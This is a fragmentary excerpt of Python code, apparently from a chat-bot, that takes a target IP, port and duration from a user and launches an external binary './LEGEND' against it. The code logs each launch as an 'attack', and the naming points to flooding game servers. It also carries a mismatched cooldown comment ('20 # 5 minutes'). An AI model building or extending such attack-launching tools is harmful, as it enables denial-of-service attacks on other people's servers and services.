...
COOLDOWN_DURATION = 20  # 5 minutes
...
def bgmi_command(message):
    ...
    try:
        ...
        logging.info(f"Attack started by {user_name}: ./LEGEND {target_ip} {target_port} {default_duration} 677")
...
async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./LEGEND {target_ip} {target_port} {duration} 677"
